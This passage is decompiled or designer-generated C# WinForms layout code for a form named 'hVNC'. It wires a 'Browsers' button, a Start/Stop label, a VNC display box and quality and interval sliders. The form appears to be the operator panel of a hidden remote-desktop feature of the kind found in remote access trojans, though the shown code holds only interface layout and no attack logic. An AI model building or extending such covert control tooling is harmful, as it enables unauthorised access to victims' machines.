			this.studioButton7.Location = new System.Drawing.Point(27, 455);
			this.studioButton7.Name = "studioButton7";
			this.studioButton7.NoRounding = false;
			this.studioButton7.Size = new System.Drawing.Size(94, 25);
			this.studioButton7.TabIndex = 76;
			this.studioButton7.Text = "Browsers";
			this.studioButton7.Transparent = true;
			this.studioButton7.Click += new System.EventHandler(studioButton7_Click);
			this.label2.AutoSize = true;
			this.label2.BackColor = System.Drawing.Color.Transparent;
			this.label2.Font = new System.Drawing.Font("Verdana", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.label2.Location = new System.Drawing.Point(11, 548);
			this.label2.Name = "label2";
			this.label2.Size = new System.Drawing.Size(117, 39);
			this.label2.TabIndex = 80;
			this.label2.Text = "      All fuctions\r\n    have 2 functions\r\n        Start/Stop\r\n";
			base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			base.ClientSize = new System.Drawing.Size(1223, 678);
			base.Controls.Add(this.primeTheme1);
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
			base.MinimizeBox = false;
			base.Name = "hVNC";
			base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
			base.TransparencyKey = System.Drawing.Color.Fuchsia;
			base.FormClosing += new System.Windows.Forms.FormClosingEventHandler(VNCForm_FormClosing);
			base.Load += new System.EventHandler(VNCForm_Load);
			base.Click += new System.EventHandler(VNCForm_Click);
			base.KeyPress += new System.Windows.Forms.KeyPressEventHandler(VNCForm_KeyPress);
			this.contextMenuStrip1.ResumeLayout(false);
			this.contextMenuStrip2.ResumeLayout(false);
			this.contextMenuStrip3.ResumeLayout(false);
			this.contextMenuStrip4.ResumeLayout(false);
			this.contextMenuStrip5.ResumeLayout(false);
			this.contextMenuStrip6.ResumeLayout(false);
			this.primeTheme1.ResumeLayout(false);
			this.primeTheme1.PerformLayout();
			((System.ComponentModel.ISupportInitialize)this.VNCBox).EndInit();
			((System.ComponentModel.ISupportInitialize)this.pictureBox1).EndInit();
			this.groupBox6.ResumeLayout(false);
			this.groupBox6.PerformLayout();
			((System.ComponentModel.ISupportInitialize)this.IntervalScroll).EndInit();
			((System.ComponentModel.ISupportInitialize)this.QualityScroll).EndInit();
			((System.ComponentModel.ISupportInitialize)this.ResizeScroll).EndInit();
			base.ResumeLayout(false);
		}
	}
}
